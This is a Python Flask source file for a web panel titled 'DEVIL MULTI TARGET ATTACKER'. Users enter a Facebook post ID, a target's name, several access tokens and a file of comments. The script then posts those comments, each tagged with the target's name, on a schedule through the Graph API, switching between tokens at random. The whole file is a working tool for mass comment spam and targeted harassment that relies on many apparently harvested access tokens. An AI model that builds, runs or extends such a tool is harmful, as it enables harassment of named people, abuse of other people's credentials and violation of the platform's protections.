from flask import Flask, request, redirect, url_for, render_template_string
import threading
import schedule
import time
import random
import requests

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Global Data
user_data = {}
schedulers = {}

# HTML Template
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DEVIL MULTI TARGET ATTACKER PANEL</title>
    <style>
        body { background: black; color: white; font-family: Arial; }
        .container { max-width: 600px; margin: auto; padding: 20px; background: rgba(255, 255, 255, 0.1); border-radius: 10px; margin-top: 50px; }
        input, textarea, button { width: 100%; margin-top: 10px; padding: 10px; border-radius: 5px; }
        button { background: green; color: white; font-weight: bold; }
        .stop-btn { background: red; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DEVIL MULTI TARGET ATTACKER</h1>
        <form action="/start" method="post" enctype="multipart/form-data">
            <input type="text" name="threadId" placeholder="POST ID" required>
            <input type="text" name="kidx" placeholder="Target Name" required>
            <textarea name="tokens" rows="4" placeholder="Tokens (one per line)" required></textarea>
            <input type="file" name="commentsFile" accept=".txt" required>
            <input type="number" name="time" placeholder="Speed in seconds (minimum 20)" required>
            <button type="submit">Start Commenting</button>
        </form>
        <form action="/stop" method="post" style="margin-top:20px;">
            <button class="stop-btn" type="submit">Stop Commenting</button>
        </form>
    </div>
</body>
</html>
'''

# Function to post a comment
def send_comment(user_ip):
    if user_ip not in user_data:
        return

    data = user_data[user_ip]
    thread_id = data['thread_id']
    tokens = data['tokens']
    comments = data['comments']
    target_name = data['target_name']
    comment_index = data['comment_index']

    token = random.choice(tokens)
    comment = comments[comment_index % len(comments)].strip()

    post_url = f"https://graph.facebook.com/v15.0/{thread_id}/comments"
    parameters = {
        'message': target_name + ' ' + comment,
        'access_token': token
    }

    try:
        response = requests.post(post_url, json=parameters, headers=headers)
        if response.status_code == 200:
            print(f"[{user_ip}] ✅ Comment Sent Successfully!")
        else:
            print(f"[{user_ip}] ❌ Failed to Send Comment: {response.text}")
    except Exception as e:
        print(f"[{user_ip}] ❌ Error: {str(e)}")

    # Update comment index
    user_data[user_ip]['comment_index'] += 1

# Flask Routes
@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/start', methods=['POST'])
def start():
    user_ip = request.remote_addr
    thread_id = request.form.get('threadId')
    target_name = request.form.get('kidx')
    time_interval = int(request.form.get('time'))
    tokens = request.form.get('tokens').splitlines()
    comments_file = request.files['commentsFile']
    comments = comments_file.read().decode().splitlines()

    # Save user data
    user_data[user_ip] = {
        'thread_id': thread_id,
        'target_name': target_name,
        'tokens': tokens,
        'comments': comments,
        'time_interval': time_interval,
        'comment_index': 0
    }

    # Clear any existing job
    if user_ip in schedulers:
        schedule.cancel_job(schedulers[user_ip])

    # Schedule new comment job
    job = schedule.every(time_interval).seconds.do(send_comment, user_ip=user_ip)
    schedulers[user_ip] = job

    return redirect(url_for('index'))

@app.route('/stop', methods=['POST'])
def stop():
    user_ip = request.remote_addr
    if user_ip in schedulers:
        schedule.cancel_job(schedulers[user_ip])
        del schedulers[user_ip]
        del user_data[user_ip]
    return redirect(url_for('index'))

# Background Thread to run schedule jobs
def run_schedule():
    while True:
        schedule.run_pending()
        time.sleep(1)

# Start Background Thread
threading.Thread(target=run_schedule, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
